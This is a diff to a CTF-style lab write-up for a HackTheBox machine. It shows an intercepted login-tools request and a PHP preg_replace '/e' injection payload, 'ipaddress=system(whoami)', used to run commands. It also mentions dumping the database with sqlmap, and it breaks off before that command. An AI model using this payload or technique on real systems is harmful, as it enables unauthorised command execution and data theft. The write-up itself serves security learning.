@@ -140,4 +140,68 @@ to login i use burp to intercept the login request and i change the `POST` data 
 now i'm in
 i was in dashboard after crawling i found this `https://admin-portal.europacorp.htb/tools.php` that could let me in the machine 
 ![[Pasted image 20251008123253.png]]
+write anything and intercept it by burp and the request will look like this : (after decode it)
+```python
+POST /tools.php HTTP/1.1
+Host: admin-portal.europacorp.htb
+Cookie: PHPSESSID=o2ijk8chp7f6t0446m8n7bgkd2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1681
+Origin: https://admin-portal.europacorp.htb
+Referer: https://admin-portal.europacorp.htb/tools.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
 
+pattern=/ip_address/&ipaddress=ali&text="openvpn": {
+        "vtun0": {
+                "local-address": {
+                        "10.10.10.1": "''"
+                },
+                "local-port": "1337",
+                "mode": "site-to-site",
+                "openvpn-option": [
+                        "--comp-lzo",
+                        "--float",
+                        "--ping 10",
+                        "--ping-restart 20",
+                        "--ping-timer-rem",
+                        "--persist-tun",
+                        "--persist-key",
+                        "--user nobody",
+                        "--group nogroup"
+                ],
+                "remote-address": "ip_address",
+                "remote-port": "1337",
+                "shared-secret-key-file": "/config/auth/secret"
+        },
+        "protocols": {
+                "static": {
+                        "interface-route": {
+                                "ip_address/24": {
+                                        "next-hop-interface": {
+                                                "vtun0": "''"
+                                        }
+                                }
+                        }
+                }
+        }
+}
+                                
+```
+
+if you see here `/ip_address/` this is  Regular Expressions which is danger, after search i found that if i add `e` , like this `/ip_address/e` and change this to command `ipaddress=ali` change `ali` to the command
+
+after all it will be like this **`pattern=/ip_address/e&ipaddress=system(whoami)&text="openvpn":`**'
+
+but before all of this , dont forget that we have sqli and we can use sqlmap to get some `--dump`
+by using this command
